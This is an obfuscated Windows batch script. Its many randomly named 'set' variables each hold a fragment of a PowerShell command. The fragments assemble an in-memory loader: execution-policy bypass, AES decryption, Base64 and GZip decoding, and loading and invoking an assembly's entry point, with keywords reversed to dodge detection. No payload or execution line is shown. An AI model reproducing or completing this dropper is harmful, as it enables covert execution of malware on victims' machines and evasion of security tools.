@echo off
set "cgPJLGhBJK=F'[-"
set "lHGIOutWpF=);$N"
set "pkxexEjECt=Al.T"
set "fRTwtTQSQW=n ''"
set "KFAELthQeV=iron"
set "rHYWyUAaCM=d.Pa"
set "MmDpzuMape=pres"
set "XZzOTabFjt=urit"
set "DrNjbvvjdJ=e]::"
set "GyoZHzhLMu=$ExO"
set "ARmNfWMAQu=Stre"
set "lknamTunxt=ecry"
set "HFZBVioXGk=Star"
set "RkDYCbgQXp=rtS4"
set "zHqvMtHkgs=.Dis"
set "pFMadsiwvB=NpMe"
set "izLlVmPVzW=ed.I"
set "QpAxtmJDdp=)) {"
set "PQRNsiPyUC=ring"
set "CzElYGdOSr=K = "
set "qMofCZZxyJ=d;$N"
set "vOGttXiFmJ=New-"
set "YHZEnWTERD=vert"
set "wWwDlabzrf=sion"
set "MdCfMqMkwv=$Nrh"
set "XTvkFlxxDK=xK ="
set "CXsmWyFuuU=ion."
set "BqebpTehyY=6] -"
set "PagZvCGTaN=V = "
set "XfPcNbVwbO=ress"
set "qJEKheJvlA= [Sy"
set "mFAdsJymIl=.Key"
set "TMugYugETN=3HWs"
set "OuTMHFDJfO=7;$N"
set "FmhFkIODMI=ddin"
set "qyrtLxUMOi='gni"
set "vYhNCOAZQh=vj0m"
set "EdPYxPZWpZ=and "
set "MzJaWXaerh=.Ass"
set "brTjiopFKa=zOO."
set "KukEOjTPtX=em.C"
set "SPYCweKTCe=wzEh"
set "KXcousFMPa=gMod"
set "jplskUdBHF=oryS"
set "NYYysJSCDw='[-1"
set "iFLihAwWFY=.Cop"
set "WYIpBNyUgN=ose("
set "nLZZbbXpDA=$NpM"
set "pXTbZEoNvi=[Sys"
set "RfSJoOOFmK=xK);"
set "sQYaNhrdMk=;$Qx"
set "EjdvmFzncS=oint"
set "VnyJxozrJF=bpw."
set "fEyrqrbXnw=-ep "
set "ncURnKzQse=bypa"
set "HughlWIwpg=.Mod"
set "zWQBUWgSkZ=rABI"
set "zSYosmxirN=);$N"
set "uEmEDAKAZq=y.Ci"
set "VSZgeFzSYm=ExOx"
set "payPGjtOtb=PKCS"
set "ePPtYzRfan=ay()"
set "jdyeVMnqOi=esMa"
set "VqmXJiaTqz=);$L"
set "NKRriVViFy=1] -"
set "YJOnvifWSM=ment"
set "tpjkiGoIVn=File"
set "ahPwOUtqbQ=js.T"
set "HlGqAEFNZc=:('g"
set "putoZkFqIK=.GZi"
set "NYeyeWFhUG=tem."
set "VFBdWYUROh=-joi"
set "QLzlLRykYV=]::("
set "RDRxOSdzLL=New-"
set "pnNxjlzPgs=OyzA"
set "XQRfTmVCvD=pMed"
set "XPvBqkrwxo== [S"
set "gheLWHnpwx=ionM"
set "guwMlyuuOW=KjXO"
set "LgyNlWnwyz=]::N"
set "RTODJZrFzx=le  "
set "svsjjiaXwl='[-1"
set "udpPklGKlr=ert]"
set "KVCUBRBVnh=EhJ "
set "DdZQidixlg=Obje"
set "SuldwHgeFP= = $"
set "SlomNWsxFl='txe"
set "fRaTkoUqlh=join"
set "QqhCsntDge=6esa"
set "hgOmGXNcEC=.Cre"
set "SJJxyweDpD=; };"
